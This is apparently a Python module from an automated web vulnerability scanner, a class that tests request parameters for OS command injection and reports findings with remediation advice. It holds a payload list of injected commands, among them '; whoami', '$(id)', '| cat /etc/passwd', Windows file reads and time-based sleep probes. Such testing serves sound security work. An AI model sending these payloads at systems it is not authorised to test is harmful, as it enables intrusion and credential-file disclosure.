"""
Command Injection Agent - Detects OS Command Injection vulnerabilities.
"""
import re
import time
import asyncio
from typing import List, Dict, Any, Optional
from urllib.parse import quote

from .base_agent import BaseSecurityAgent, AgentResult
from models.vulnerability import Severity, VulnerabilityType


class CommandInjectionAgent(BaseSecurityAgent):
    """
    OS Command Injection detection agent.
    
    Tests for:
    - Direct command injection
    - Blind command injection (time-based)
    - Various injection vectors (;, |, &&, ||, $(), ``)
    """
    
    agent_name = "command_injection"
    agent_description = "Tests for OS Command Injection vulnerabilities"
    vulnerability_types = [VulnerabilityType.COMMAND_INJECTION]
    
    # Command injection payloads with expected outputs
    ERROR_BASED_PAYLOADS = [
        # Unix commands
        ("; whoami", ["root", "www-data", "apache", "nginx", "node", "admin"]),
        ("| whoami", ["root", "www-data", "apache", "nginx", "node", "admin"]),
        ("|| whoami", ["root", "www-data", "apache", "nginx", "node", "admin"]),
        ("&& whoami", ["root", "www-data", "apache", "nginx", "node", "admin"]),
        ("; id", ["uid=", "gid=", "groups="]),
        ("| id", ["uid=", "gid=", "groups="]),
        ("`id`", ["uid=", "gid=", "groups="]),
        ("$(id)", ["uid=", "gid=", "groups="]),
        ("; uname -a", ["Linux", "Darwin", "Unix", "BSD"]),
        ("| cat /etc/passwd", ["root:", "nobody:", "/bin/bash", "/bin/sh"]),
        
        # Windows commands
        ("| whoami", ["\\", "SYSTEM", "Administrator"]),
        ("& whoami", ["\\", "SYSTEM", "Administrator"]),
        ("| dir", ["Volume", "Directory", "File(s)"]),
        ("& dir", ["Volume", "Directory", "File(s)"]),
        ("| type C:\\Windows\\win.ini", ["[fonts]", "[extensions]"]),
    ]
    
    # Time-based blind payloads
    TIME_BASED_PAYLOADS = [
        # Unix sleep
        ("; sleep {delay}", "sleep"),
        ("| sleep {delay}", "sleep"),
        ("|| sleep {delay}", "sleep"),
        ("&& sleep {delay}", "sleep"),
        ("`sleep {delay}`", "sleep"),
        ("$(sleep {delay})", "sleep"),
        
        # Windows timeout/ping
        ("& ping -n {delay} 127.0.0.1", "ping"),
        ("| ping -n {delay} 127.0.0.1", "ping"),
        ("& timeout /t {delay}", "timeout"),
    ]
    
    # Parameter patterns likely to be vulnerable
    VULN_PARAM_PATTERNS = [
        r'cmd', r'command', r'exec', r'execute', r'run',
        r'ping', r'host', r'ip', r'query', r'arg',
        r'file', r'filename', r'path', r'dir', r'folder',
        r'include', r'page', r'daemon', r'process',
        r'option', r'flag', r'action', r'do'
    ]
    
    async def scan(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        technology_stack: List[str] = None,
        scan_context: Optional[Any] = None
    ) -> List[AgentResult]:
        """
        Scan for command injection vulnerabilities.
        """
        results = []
        
        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            params = endpoint.get("params", {})
            method = endpoint.get("method", "GET")
            
            # Find potentially vulnerable parameters
            vuln_params = self._find_vulnerable_parameters(params, url)
            
            for param_name in vuln_params:
                # Test error-based injection
                error_result = await self._test_error_based(url, method, params, param_name)
                if error_result:
                    results.append(error_result)
                    continue
                
                # Test time-based blind injection
                time_result = await self._test_time_based(url, method, params, param_name)
                if time_result:
                    results.append(time_result)
        
        return results
    
    def _find_vulnerable_parameters(
        self, 
        params: Dict[str, Any], 
        url: str
    ) -> List[str]:
        """Find parameters that might be vulnerable to command injection."""
        vuln_params = []
        
        # Check parameter names
        for param_name in params.keys():
            for pattern in self.VULN_PARAM_PATTERNS:
                if re.search(pattern, param_name, re.IGNORECASE):
                    vuln_params.append(param_name)
                    break
        
        # Check URL path for patterns
        url_lower = url.lower()
        if any(p in url_lower for p in ['ping', 'exec', 'run', 'cmd', 'shell']):
            # URL suggests command execution, test all params
            vuln_params = list(params.keys())
        
        # If no specific params found, test first few params
        if not vuln_params and params:
            vuln_params = list(params.keys())[:3]
        
        return vuln_params
    
    async def _test_error_based(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        param_name: str
    ) -> Optional[AgentResult]:
        """Test for error-based command injection."""
        original_value = params.get(param_name, "")
        
        for payload, indicators in self.ERROR_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = f"{original_value}{payload}"
            
            try:
                if method.upper() == "GET":
                    response = await self.make_request(url, params=test_params)
                else:
                    response = await self.make_request(url, method=method, data=test_params)
                
                if response and any(ind in response.text for ind in indicators):
                    # Verify it's actual command output, not error message
                    is_real = self._verify_command_output(response.text, indicators)
                    
                    if is_real:
                        # Use AI to analyze
                        ai_analysis = await self.analyze_with_ai(
                            vulnerability_type="Command Injection",
                            context=f"Parameter: {param_name}, Payload: {payload}",
                            response_data=response.text[:1500]
                        )
                        
                        return self.create_result(
                            vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                            is_vulnerable=True,
                            severity=Severity.CRITICAL,
                            confidence=ai_analysis.get("confidence", 90),
                            url=url,
                            parameter=param_name,
                            method=method,
                            title=f"OS Command Injection in '{param_name}'",
                            description=(
                                f"The '{param_name}' parameter is vulnerable to OS command injection. "
                                f"Arbitrary system commands can be executed on the server."
                            ),
                            evidence=f"Payload: {payload}\nOutput indicators: {[i for i in indicators if i in response.text][:3]}",
                            request_data={"param": param_name, "payload": payload},
                            response_snippet=response.text[:500],
                            ai_analysis=ai_analysis.get("reason", ""),
                            likelihood=9.0,
                            impact=10.0,
                            exploitability_rationale=(
                                "Directly exploitable. Command injection allows full server compromise, "
                                "data exfiltration, lateral movement, and persistence."
                            ),
                            remediation=(
                                "1. NEVER pass user input directly to system commands\n"
                                "2. Use parameterized APIs (e.g., subprocess with shell=False)\n"
                                "3. Implement strict input validation (allowlist characters)\n"
                                "4. Use language-specific safe alternatives\n"
                                "5. Run with minimal privileges (principle of least privilege)"
                            ),
                            owasp_category="A03:2021 – Injection",
                            cwe_id="CWE-78"
                        )
                        
            except Exception as e:
                print(f"[CmdInjection] Error testing {payload}: {e}")
        
        return None
    
    async def _test_time_based(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        param_name: str
    ) -> Optional[AgentResult]:
        """Test for time-based blind command injection."""
        original_value = params.get(param_name, "")
        
        # Establish baseline timing
        baseline_times = []
        for _ in range(3):
            start = time.time()
            try:
                if method.upper() == "GET":
                    await self.make_request(url, params=params)
                else:
                    await self.make_request(url, method=method, data=params)
            except:
                pass
            baseline_times.append(time.time() - start)
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        # Test with time delays
        for delay in [3, 5]:
            for payload_template, payload_type in self.TIME_BASED_PAYLOADS:
                payload = payload_template.format(delay=delay)
                test_params = params.copy()
                test_params[param_name] = f"{original_value}{payload}"
                
                try:
                    start = time.time()
                    if method.upper() == "GET":
                        response = await self.make_request(url, params=test_params)
                    else:
                        response = await self.make_request(url, method=method, data=test_params)
                    elapsed = time.time() - start
                    
                    # Check if delay matches expected
                    expected_min = avg_baseline + delay - 1
                    expected_max = avg_baseline + delay + 2
                    
                    if expected_min <= elapsed <= expected_max:
                        # Confirm with different delay
                        if await self._confirm_time_based(url, method, params, param_name, payload_template, delay + 2):
                            return self.create_result(
                                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                                is_vulnerable=True,
                                severity=Severity.CRITICAL,
                                confidence=90,
                                url=url,
                                parameter=param_name,
                                method=method,
                                title=f"Blind Command Injection in '{param_name}' (Time-based)",
                                description=(
                                    f"The '{param_name}' parameter is vulnerable to blind command injection. "
                                    f"Confirmed via time-based detection using {payload_type} command."
                                ),
                                evidence=f"Payload: {payload}\nBaseline: {avg_baseline:.2f}s, Delayed: {elapsed:.2f}s (expected ~{delay}s delay)",
                                request_data={"param": param_name, "payload": payload},
                                likelihood=9.0,
                                impact=10.0,
                                exploitability_rationale=(
                                    "Directly exploitable. Blind command injection confirmed with time-based analysis. "
                                    "Output can be exfiltrated via DNS, HTTP callbacks, or time-based data extraction."
                                ),
                                remediation=(
                                    "1. NEVER pass user input directly to system commands\n"
                                    "2. Use parameterized APIs (e.g., subprocess with shell=False)\n"
                                    "3. Implement strict input validation\n"
                                    "4. Use language-specific safe alternatives"
                                ),
                                owasp_category="A03:2021 – Injection",
                                cwe_id="CWE-78"
                            )
                            
                except Exception as e:
                    print(f"[CmdInjection] Time-based error: {e}")
        
        return None
    
    async def _confirm_time_based(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        param_name: str,
        payload_template: str,
        delay: int
    ) -> bool:
        """Confirm time-based injection with different delay."""
        original_value = params.get(param_name, "")
        payload = payload_template.format(delay=delay)
        test_params = params.copy()
        test_params[param_name] = f"{original_value}{payload}"
        
        try:
            start = time.time()
            if method.upper() == "GET":
                await self.make_request(url, params=test_params)
            else:
                await self.make_request(url, method=method, data=test_params)
            elapsed = time.time() - start
            
            # Should be at least delay - 1 seconds
            return elapsed >= delay - 1
            
        except:
            return False
    
    def _verify_command_output(self, response_text: str, indicators: List[str]) -> bool:
        """Verify that the response contains actual command output."""
        # Count how many indicators are present
        matches = sum(1 for ind in indicators if ind in response_text)
        
        # More indicators = more likely real
        if matches >= 2:
            return True
        
        # Check for specific patterns
        # uid= pattern from 'id' command
        if re.search(r'uid=\d+', response_text):
            return True
        
        # root: pattern from passwd file
        if re.search(r'root:[x*]:\d+:\d+:', response_text):
            return True
        
        # Windows directory listing
        if re.search(r'\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}', response_text):
            return True
        
        return matches > 0
